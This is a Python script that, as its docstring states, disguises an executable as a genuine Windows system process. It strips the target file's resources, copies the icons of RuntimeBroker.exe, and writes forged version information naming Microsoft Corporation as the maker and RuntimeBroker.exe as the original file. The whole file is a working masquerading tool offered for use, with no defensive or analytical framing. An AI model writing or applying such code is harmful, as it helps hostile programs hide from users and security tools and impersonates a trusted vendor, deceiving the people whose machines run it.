"""Disguise exe as a genuine Windows system process.
Patches version info + copies icon from a real system exe."""
import ctypes, ctypes.wintypes, struct, sys
from pathlib import Path

_k32 = ctypes.windll.kernel32
RT_ICON, RT_GROUP_ICON, RT_VERSION = 3, 14, 16

def _mir(i):
    return ctypes.cast(i, ctypes.wintypes.LPCWSTR)

def _pad(d):
    r = len(d) % 4
    return d + b"\x00" * ((4 - r) if r else 0)

def _se(k, v):
    kb, vb = k.encode("utf-16-le") + b"\x00\x00", v.encode("utf-16-le") + b"\x00\x00"
    h = _pad(struct.pack("<HHH", 0, len(v)+1, 1) + kb)
    b = bytearray(h + vb); struct.pack_into("<H", b, 0, len(b))
    return _pad(bytes(b))

def _st(lcp, s):
    k = lcp.encode("utf-16-le") + b"\x00\x00"
    h = _pad(struct.pack("<HHH", 0, 0, 1) + k)
    c = b"".join(_se(a, b) for a, b in s.items())
    d = bytearray(h + c); struct.pack_into("<H", d, 0, len(d))
    return _pad(bytes(d))

def _sfi(lcp, s):
    k = "StringFileInfo".encode("utf-16-le") + b"\x00\x00"
    h = _pad(struct.pack("<HHH", 0, 0, 1) + k)
    d = bytearray(h + _st(lcp, s)); struct.pack_into("<H", d, 0, len(d))
    return _pad(bytes(d))

def _vfi(l, c):
    k1 = "Translation".encode("utf-16-le") + b"\x00\x00"
    v = struct.pack("<HH", l, c)
    h1 = _pad(struct.pack("<HHH", 0, len(v), 0) + k1)
    d1 = bytearray(h1 + v); struct.pack_into("<H", d1, 0, len(d1))
    k2 = "VarFileInfo".encode("utf-16-le") + b"\x00\x00"
    h2 = _pad(struct.pack("<HHH", 0, 0, 1) + k2)
    d2 = bytearray(h2 + _pad(bytes(d1))); struct.pack_into("<H", d2, 0, len(d2))
    return _pad(bytes(d2))

def build_ver():
    """Build version info that looks like a real Windows system file."""
    # Version 10.0.22621.4317 (Windows 11 22H2)
    fv_ms, fv_ls = (10 << 16) | 0, (22621 << 16) | 4317
    f = struct.pack("<IIIIIIIIIIIII", 0xFEEF04BD, 0x00010000,
        fv_ms, fv_ls, fv_ms, fv_ls, 0x3F, 0, 0x00040004, 1, 0, 0, 0)
    s = {
        "CompanyName": "Microsoft Corporation",
        "FileDescription": "Runtime Broker",
        "FileVersion": "10.0.22621.4317 (WinBuild.160101.0800)",
        "InternalName": "RuntimeBroker.exe",
        "LegalCopyright": "\u00a9 Microsoft Corporation. All rights reserved.",
        "OriginalFilename": "RuntimeBroker.exe",
        "ProductName": "Microsoft\u00ae Windows\u00ae Operating System",
        "ProductVersion": "10.0.22621.4317",
    }
    sfi = _sfi("040904B0", s); vfi = _vfi(0x0409, 0x04B0)
    k = "VS_VERSION_INFO".encode("utf-16-le") + b"\x00\x00"
    h = _pad(struct.pack("<HHH", 0, len(f), 0) + k)
    d = bytearray(h + _pad(f) + sfi + vfi); struct.pack_into("<H", d, 0, len(d))
    return bytes(d)

# ── Resource read helpers ──────────────────────────────────────────

def _setup_sigs():
    _k32.LoadLibraryExW.argtypes = [ctypes.wintypes.LPCWSTR, ctypes.wintypes.HANDLE, ctypes.wintypes.DWORD]
    _k32.LoadLibraryExW.restype = ctypes.c_void_p
    _k32.FindResourceW.argtypes = [ctypes.c_void_p, ctypes.wintypes.LPCWSTR, ctypes.wintypes.LPCWSTR]
    _k32.FindResourceW.restype = ctypes.c_void_p
    _k32.SizeofResource.argtypes = [ctypes.c_void_p, ctypes.c_void_p]
    _k32.SizeofResource.restype = ctypes.wintypes.DWORD
    _k32.LoadResource.argtypes = [ctypes.c_void_p, ctypes.c_void_p]
    _k32.LoadResource.restype = ctypes.c_void_p
    _k32.LockResource.argtypes = [ctypes.c_void_p]
    _k32.LockResource.restype = ctypes.c_void_p
    _k32.FreeLibrary.argtypes = [ctypes.c_void_p]
    _k32.FreeLibrary.restype = ctypes.wintypes.BOOL
    _k32.BeginUpdateResourceW.argtypes = [ctypes.wintypes.LPCWSTR, ctypes.wintypes.BOOL]
    _k32.BeginUpdateResourceW.restype = ctypes.wintypes.HANDLE
    _k32.UpdateResourceW.argtypes = [ctypes.wintypes.HANDLE, ctypes.wintypes.LPCWSTR,
        ctypes.wintypes.LPCWSTR, ctypes.wintypes.WORD, ctypes.c_void_p, ctypes.wintypes.DWORD]
    _k32.UpdateResourceW.restype = ctypes.wintypes.BOOL
    _k32.EndUpdateResourceW.argtypes = [ctypes.wintypes.HANDLE, ctypes.wintypes.BOOL]
    _k32.EndUpdateResourceW.restype = ctypes.wintypes.BOOL

def _read_res(h, rtype, rid):
    hr = _k32.FindResourceW(h, _mir(rid), _mir(rtype))
    if not hr: return None
    sz = _k32.SizeofResource(h, hr)
    if not sz: return None
    hd = _k32.LoadResource(h, hr)
    if not hd: return None
    p = _k32.LockResource(hd)
    if not p: return None
    buf = (ctypes.c_ubyte * sz)()
    ctypes.memmove(buf, p, sz)
    return bytes(buf)

def _get_icon_ids(grp_data):
    """Parse RT_GROUP_ICON to get list of RT_ICON resource IDs."""
    if not grp_data or len(grp_data) < 6: return []
    count = struct.unpack_from("<H", grp_data, 4)[0]
    ids = []
    for i in range(count):
        off = 6 + i * 14 + 12
        if off + 2 <= len(grp_data):
            ids.append(struct.unpack_from("<H", grp_data, off)[0])
    return ids

# ── Main patch ─────────────────────────────────────────────────────

def patch(exe, icon_src=None):
    _setup_sigs()

    # 1. Read old icon IDs from target so we can delete them
    old_ids = []
    h = _k32.LoadLibraryExW(exe, None, 2)
    if h:
        grp = _read_res(h, RT_GROUP_ICON, 1)
        old_ids = _get_icon_ids(grp)
        _k32.FreeLibrary(h)

    # 2. Read new icons from system exe
    new_grp = None
    new_icons = {}
    if icon_src:
        h = _k32.LoadLibraryExW(icon_src, None, 2)
        if h:
            new_grp = _read_res(h, RT_GROUP_ICON, 1)
            for nid in _get_icon_ids(new_grp):
                d = _read_res(h, RT_ICON, nid)
                if d: new_icons[nid] = d
            _k32.FreeLibrary(h)

    # 3. Begin update — wipe ALL existing resources (Python has many language variants)
    hu = _k32.BeginUpdateResourceW(exe, True)
    if not hu: return False

    # 5. Write new icons
    for nid, data in new_icons.items():
        _k32.UpdateResourceW(hu, _mir(RT_ICON), _mir(nid), 0x0409, data, len(data))
    if new_grp:
        _k32.UpdateResourceW(hu, _mir(RT_GROUP_ICON), _mir(1), 0x0409, new_grp, len(new_grp))

    # 6. Write version info
    ver = build_ver()
    _k32.UpdateResourceW(hu, _mir(RT_VERSION), _mir(1), 0x0409, ver, len(ver))

    return bool(_k32.EndUpdateResourceW(hu, False))


if __name__ == "__main__":
    exe = str(Path(sys.argv[1]).resolve())
    # Use RuntimeBroker.exe icon by default
    icon_src = r"C:\Windows\System32\RuntimeBroker.exe"
    if len(sys.argv) > 2:
        icon_src = sys.argv[2]
    patch(exe, icon_src)
